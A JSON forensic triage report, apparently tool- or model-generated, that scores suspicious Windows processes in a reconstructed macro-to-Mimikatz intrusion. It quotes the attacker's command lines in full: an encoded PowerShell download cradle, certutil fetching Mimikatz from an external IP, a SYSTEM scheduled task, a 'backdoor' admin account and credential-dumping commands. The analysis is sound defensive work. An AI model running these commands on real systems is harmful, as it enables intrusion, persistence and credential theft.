@@ -1,0 +1,180 @@
+{
+  "generated_at": "2026-05-11T14:32:07Z",
+  "top_n": 10,
+  "reasoning_summary": "A malicious macro in an Office document spawned PowerShell, which decoded a Base64 payload and downloaded additional scripts. The PowerShell process launched a randomly\u2011named executable (a3f8c21d.exe) that created a scheduled task, added a privileged user, fetched Mimikatz via certutil, and opened persistent C2 connections. Token mixing (SYSTEM + user SID) and use of LOLBins (certutil, rundll32) confirm a full attack chain from initial access to credential dumping and persistence.",
+  "suspicious_processes": [
+    {
+      "pid": "3412",
+      "ppid": "3120",
+      "image": "powershell.exe",
+      "score": 9,
+      "confidence": "high",
+      "reasons": [
+        "Spawn anomaly: Office process (WINWORD.EXE) launched PowerShell",
+        "Base64\u2011encoded command (-Enc) that decodes and downloads a script",
+        "Outbound connection to 192.168.55.10:80 from PowerShell"
+      ],
+      "attack_phase": "execution",
+      "evidence": {
+        "commands": [
+          "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUANQAuADEAMAAvAHMAdABhAGcAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMxACcAKQ==",
+          "cmd.exe /c powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.55.10/stage/payload.ps1')\""
+        ],
+        "dlls": [
+          "amsi.dll"
+        ],
+        "network": [
+          "192.168.55.10:80"
+        ]
+      }
+    },
+    {
+      "pid": "3688",
+      "ppid": "3412",
+      "image": "a3f8c21d.exe",
+      "score": 10,
+      "confidence": "high",
+      "reasons": [
+        "Random executable name launched by PowerShell",
+        "Creates scheduled task running as SYSTEM",
+        "Adds local admin user \"backdoor\"",
+        "Holds both user and SYSTEM SIDs (privilege anomaly)",
+        "Persistent C2 connections to 185.220.101.45:443"
+      ],
+      "attack_phase": "persistence",
+      "evidence": {
+        "commands": [
+          "C:\\Users\\john.doe\\AppData\\Roaming\\a3f8c21d.exe --connect 185.220.101.45:443 --persist",
+          "schtasks /create /tn \"WindowsUpdateHelper\" /tr \"C:\\Users\\john.doe\\AppData\\Roaming\\a3f8c21d.exe\" /sc onlogon /ru SYSTEM",
+          "net user backdoor P@ssw0rd123 /add"
+        ],
+        "dlls": [
+          "cryptbase.dll"
+        ],
+        "network": [
+          "185.220.101.45:443",
+          "185.220.101.45:443"
+        ]
+      }
+    },
+    {
+      "pid": "3744",
+      "ppid": "3688",
+      "image": "certutil.exe",
+      "score": 8,
+      "confidence": "high",
+      "reasons": [
+        "LOLBIN certutil used to download a file from external IP",
+        "Downloads mimikatz.exe to Temp directory"
+      ],
+      "attack_phase": "credential_access",
+      "evidence": {
+        "commands": [
+          "certutil -urlcache -split -f http://185.220.101.45/tools/mimikatz.exe C:\\Users\\john.doe\\AppData\\Local\\Temp\\svcupd.exe"
+        ],
+        "dlls": [],
+        "network": [
+          "185.220.101.45:80"
+        ]
+      }
+    },
+    {
+      "pid": "3900",
+      "ppid": "3688",
+      "image": "svcupd.exe",
+      "score": 8,
+      "confidence": "high",
+      "reasons": [
+        "Mimikatz binary executed with privileged SYSTEM token",
+        "Runs sekurlsa::logonpasswords and privilege::debug"
+      ],
+      "attack_phase": "credential_access",
+      "evidence": {
+        "commands": [
+          "C:\\Users\\john.doe\\AppData\\Local\\Temp\\svcupd.exe sekurlsa::logonpasswords full",
+          "C:\\Users\\john.doe\\AppData\\Local\\Temp\\svcupd.exe privilege::debug"
+        ],
+        "dlls": [
+          "mimilib.dll"
+        ],
+        "network": []
+      }
+    },
+    {
+      "pid": "3980",
+      "ppid": "3688",
+      "image": "rundll32.exe",
+      "score": 7,
+      "confidence": "medium",
+      "reasons": [
+        "LOLBIN rundll32 used to register a DLL from ProgramData",
+        "Outbound connection to 185.220.101.45:8080"
+      ],
+      "attack_phase": "execution",
+      "evidence": {
+        "commands": [
+          "rundll32.exe C:\\ProgramData\\update\\srpd32.dll,DllRegisterServer"
+        ],
+        "dlls": [
+          "srpd32.dll"
+        ],
+        "network": [
+          "185.220.101.45:8080"
+        ]
+      }
+    },
+    {
+      "pid": "3120",
+      "ppid": "2860",
+      "image": "WINWORD.EXE",
+      "score": 5,
+      "confidence": "medium",
+      "reasons": [
+        "Spawn anomaly: launched PowerShell from a document",
+        "Opened a suspicious Office file from Downloads folder"
+      ],
+      "attack_phase": "initial_access",
+      "evidence": {
+        "commands": [
+          "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\john.doe\\Downloads\\invoice_Q1_2021.doc\""
+        ],
+        "dlls": [],
+        "network": []
+      }
+    },
+    {
+      "pid": "4",
+      "ppid": "0",
+      "image": "System",
+      "score": 2,
+      "confidence": "low",
+      "reasons": [
+        "System process holds SYSTEM SID (baseline) but appears in anomaly list due to token mixing later"
+      ],
+      "attack_phase": "unknown",
+      "evidence": {
+        "commands": [],
+        "dlls": [],
+        "network": []
+      }
+    }
+  ],
+  "suspicious_paths": [
+    {
+      "path": "C:\\Users\\john.doe\\AppData\\Roaming\\a3f8c21d.exe",
+      "related_pids": [
+        "3688"
+      ],
+      "reason": "Randomly named executable launched from user AppData, creates SYSTEM scheduled task and opens C2"
+    },
+    {
+      "path": "C:\\Users\\john.doe\\AppData\\Local\\Temp\\svcupd.exe",
+      "related_pids": [
+        "3900"
+      ],
+      "reason": "Mimikatz binary dropped via certutil, executed with SYSTEM privileges"
+    }
+  ],
+  "suspicious_services": [],
+  "suspicious_tasks": []
+}
